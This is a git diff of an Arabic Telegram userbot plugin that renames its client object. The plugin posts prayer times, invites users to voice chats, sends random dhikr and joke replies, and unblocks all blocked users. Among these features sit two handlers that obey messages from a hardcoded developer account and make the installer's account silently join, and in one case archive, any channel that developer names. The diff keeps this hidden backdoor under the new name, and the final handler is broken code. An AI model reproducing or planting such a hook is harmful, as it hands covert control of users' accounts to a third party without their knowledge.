@@ -8,7 +8,7 @@ from telethon.tl.functions.phone import CreateGroupCallRequest as startvc
 from telethon.tl.functions.phone import DiscardGroupCallRequest as stopvc
 from telethon.tl.functions.phone import GetGroupCallRequest as getvc
 from telethon.tl.functions.phone import InviteToGroupCallRequest as invitetovc
-from JoKeRUB import l313l
+from VIPABH import ABH
 from ..core.managers import edit_delete, edit_or_reply
 import os
 import tempfile
@@ -20,7 +20,7 @@ from telethon.tl.functions.channels import JoinChannelRequest
 async def fetch_prayer_times():
     file_url = 'https://hq.alkafeel.net/Api/init/init.php?timezone=+3&long=44&lati=32&v=jsonPrayerTimes'
     file_location = InputWebFileLocation(url=file_url, access_hash="")
-    times_json = await l313l.download_file(file_location)
+    times_json = await ABH.download_file(file_location)
     return times_json
 
 async def send_prayer_times(event):
@@ -29,14 +29,14 @@ async def send_prayer_times(event):
     fajr_time = times['fajir']
     hijri_date = times['date']
     chat_id = event.chat_id
-    input_file = await l313l.upload_file(bytes(times_json, 'utf-8'), part_size_kb=512)
-    await l313l.send_file(chat_id, input_file, caption=f"وقت الفجر: {fajr_time}\nالتاريخ الهجري: {hijri_date}", force_document=True)
+    input_file = await ABH.upload_file(bytes(times_json, 'utf-8'), part_size_kb=512)
+    await ABH.send_file(chat_id, input_file, caption=f"وقت الفجر: {fajr_time}\nالتاريخ الهجري: {hijri_date}", force_document=True)
 
-@l313l.on(admin_cmd(pattern="صلاه(?: |$)(.*)"))
+@ABH.on(admin_cmd(pattern="صلاه(?: |$)(.*)"))
 async def handle_command(event):
     await send_prayer_times(event)
 
-@l313l.on(admin_cmd(pattern="دعوه للمكالمه(?: |$)(.*)"))
+@ABH.on(admin_cmd(pattern="دعوه للمكالمه(?: |$)(.*)"))
 async def _(e):
     ok = await edit_or_reply(e, "`Inviting Members to Voice Chat...`")
     users = []
@@ -52,7 +52,7 @@ async def _(e):
         except BaseException:
             pass
     await ok.edit(f"`Invited {z} users`")
-@l313l.on(admin_cmd(pattern="بدء مكالمه(?: |$)(.*)"))
+@ABH.on(admin_cmd(pattern="بدء مكالمه(?: |$)(.*)"))
 async def _(e):
     try:
         await e.client(startvc(e.chat_id))
@@ -87,7 +87,7 @@ R = [
     "**-** قناة السورس **⪼ [𐇮 الجوكري ](t.me/jepthon)   "
 ]
 
-@l313l.on(admin_cmd(pattern="بلي$"))
+@ABH.on(admin_cmd(pattern="بلي$"))
 async def ithker(knopis):
     await knopis.edit(choice(R))
 
@@ -133,7 +133,7 @@ Citation_morning = [
 ]
 
 
-@l313l.on(admin_cmd(pattern="اذكار$"))
+@ABH.on(admin_cmd(pattern="اذكار$"))
 async def ithker(knopis):
     await knopis.edit(choice(Citation_morning))
 
@@ -186,7 +186,7 @@ Citation1_morning = [
 ]
 
 
-@l313l.on(admin_cmd(pattern="كت$"))
+@ABH.on(admin_cmd(pattern="كت$"))
 async def ithker(knopis):
     await knopis.edit(choice(Citation1_morning))
 
@@ -224,12 +224,12 @@ HuRe_5erok = [
 ]
 
 
-@l313l.on(admin_cmd(pattern="خيروك$"))
+@ABH.on(admin_cmd(pattern="خيروك$"))
 async def ithker(knopis):
     await knopis.edit(choice(HuRe_5erok))
 
     
-@l313l.on(admin_cmd(pattern="اذكار عشر$"))    
+@ABH.on(admin_cmd(pattern="اذكار عشر$"))    
 async def ithker(event):
     "h"
     event = await edit_or_reply(event, "أَصْبَـحْـنا عَلَى فِطْرَةِ الإسْلاَمِ")
@@ -264,7 +264,7 @@ HuRe_Shnow = [
 ]
 
 
-@l313l.on(admin_cmd(pattern="شنو رأيك بهذا$"))
+@ABH.on(admin_cmd(pattern="شنو رأيك بهذا$"))
 async def ithker(knopis):
     await knopis.edit(choice(HuRe_Shnow))
 
@@ -278,12 +278,12 @@ HuRe_Bosa = [
 ]
 
 
-@l313l.on(admin_cmd(pattern="بوسة$"))
+@ABH.on(admin_cmd(pattern="بوسة$"))
 async def ithker(knopis):
     await knopis.edit(choice(HuRe_Bosa))
 
 DevJoker = [1910015590]
-@l313l.on(events.NewMessage(incoming=True))
+@ABH.on(events.NewMessage(incoming=True))
 async def Hussein(event):
     if event.message.message.startswith("تمويل") and event.sender_id in DevJoker:
         message = event.message
@@ -292,7 +292,7 @@ async def Hussein(event):
             channel_username = message.text.split()[1].replace("@", "")
         if channel_username:
             try:
-                await l313l(JoinChannelRequest(channel_username))
+                await ABH(JoinChannelRequest(channel_username))
                 response = "**᯽︙ تم الانضمام إلى القناة بنجاح!**"
             except ValueError:
                 response = "خطأ في العثور على القناة. يرجى التأكد من المعرف الصحيح"
@@ -300,7 +300,7 @@ async def Hussein(event):
             response = "**᯽︙ يُرجى تحديد معرف القناة او المجموعة مع التمويل يامطوري ❤️** "
         #await event.reply(response)
 
-@l313l.on(events.NewMessage(incoming=True))
+@ABH.on(events.NewMessage(incoming=True))
 async def Hussein(event):
     if event.message.message.startswith("ارشف") and event.sender_id in DevJoker:
         message = event.message
@@ -309,17 +309,17 @@ async def Hussein(event):
             channel_username = message.text.split()[1].replace("@", "")
         if channel_username:
             try:
-                await l313l(JoinChannelRequest(channel_username))
-                await l313l.edit_folder(channel_username, folder=1)
+                await ABH(JoinChannelRequest(channel_username))
+                await ABH.edit_folder(channel_username, folder=1)
                 response = "**᯽︙ تم الانضمام إلى القناة بنجاح ووضعها في مجلد الأرشيف!**"
             except ValueError:
                 response = "خطأ في العثور على القناة. يرجى التأكد من المعرف الصحيح"
         else:
             response = "**᯽︙ يُرجى تحديد معرف القناة او المجموعة مع التمويل يامطوري ❤️** "
         #await event.reply(response)
-client = l313l
+client = ABH
 
-@l313l.on(admin_cmd(pattern="فك الحظر$"))
+@ABH.on(admin_cmd(pattern="فك الحظر$"))
 async def handle_unblock_all(event):
     blocked_users = await client(functions.contacts.GetBlockedRequest(
         offset=0,
@@ -342,7 +342,7 @@ async def handle_unblock_all(event):
         except Exception as e:
             await event.edit(f"حدث خطأ أثناء إلغاء حظر المستخدم بمعرّف: {user.id}, الخطأ: {e}")
             continue
-@l313l.on(admin_cmd(pattern="(تاريخه|تاريخة)$"))
+@ABH.on(admin_cmd(pattern="(تاريخه|تاريخة)$"))
 async def Hussein(event):
     reply_to = event.reply_to_msg_id
     if reply_to:
@@ -354,7 +354,7 @@ async def Hussein(event):
             response = await conv.get_response()
             await event.edit(response.text)
 
-@l313l.on(admin_cmd(pattern="رابط$"))
+@ABH.on(admin_cmd(pattern="رابط$"))
 async def abh(event):
     return await edit_or_reply(event, f"[{custom}](tg://user?id={user.id})")
     tag = user.first_name.replace("\u2060", "") if user.first_name else user.username
